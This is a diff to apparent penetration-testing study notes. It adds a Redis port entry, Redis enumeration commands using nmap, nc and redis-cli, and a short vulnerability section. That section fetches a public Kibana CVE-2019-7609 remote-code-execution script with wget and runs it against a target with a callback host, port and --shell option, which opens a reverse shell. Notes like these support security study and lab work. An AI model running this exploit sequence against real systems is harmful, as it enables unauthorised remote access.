@@ -60,6 +60,7 @@ OUPUT
 | 989, 990 |   FTPS |   FTP over SSL/TLS (implicit mode)             |  TCP                |
 | 3306     |  MySql |   mysql                                        |  TCP                |
 | 3389     |   RDP  |   Remote Desktop Protocol                      |  TCP and UDP        |
+| 6379     | Redis  |   Redis                                        |  TCP                |
 |          |        |                                                |                     |
 
 | Protocol |	Default Port |	Secured Protocol |	Default Port with TLS |
@@ -111,7 +112,7 @@ OUPUT
         - hash <https://crackstation.net/>
         - Unpredictable
     - FI: File inclusion
-        - Local File Inclusion
+        - Local File Inclusion: Attacker can include a malicious file only from the same server
         - Remote File Inclusion
     - PT: Path Traversal
     - SSRF: Server-Side Request Forgery
@@ -126,6 +127,7 @@ OUPUT
     - SQLi: SQL Injection
         - In-Band SQL Injection
         - Blind SQLi
+- [whatweb]
 - [nikto]: Vulnerability scanning
 - [searchsploit]: Finding and web application vulnerabilities
 - [hydra]: Brute Force Login
@@ -171,6 +173,18 @@ OUPUT
 - [hydra]
     - Brute Force Login
 
+# Redis
+- [namp] <nmap --script redis-info -sV -p 6379 target.ip>
+- [nc] 
+    - <nc -vn 10.10.10.10 6379>
+    - INFO
+- [redis-cli]
+    - <redis-cli -h target.ip>
+    - INFO
+    - set password for redis 
+        - <config set requirepass p@ss$12E45>
+        - SAVE
+
 # POP3
 - [telnet] <telnet target.ip 110>
 
@@ -183,12 +197,17 @@ Vulnerability Scanning Tools and Public Repositories
 - [Nexpose]
 - [OpenVAS]
 - [searchsploit]
-- [ExploitDB] <https://www.exploit-db.com>
+- [ExploitDB] https://www.exploit-db.com
 - [NVD] <https://nvd.nist.gov/vuln/search>
 - [Mitre] <https://www.cve.org>
 - [OVAL] <https://oval.cisecurity.org/repository>
 - [rapid7] <https://www.rapid7.com/db/>
 - [favicon] <https://wiki.owasp.org/index.php/OWASP_favicon_database>
+- [vulnerability]
+    - [CVE-2019-7609] https://github.com/LandGrey/CVE-2019-7609
+    - wget https://raw.githubusercontent.com/LandGrey/CVE-2019-7609/master/CVE-2019-7609-kibana-rce.py
+    - python2 CVE-2019-7609-kibana-rce.py -h
+    - python2 CVE-2019-7609-kibana-rce.py -u http://target.ip:5601 -host 10.8.56.2 -port 4444 --shell
 Firefox network.security.ports.banned.override
 - [ERR]: network.security.ports.banned.override > string : 22
 Stegan files
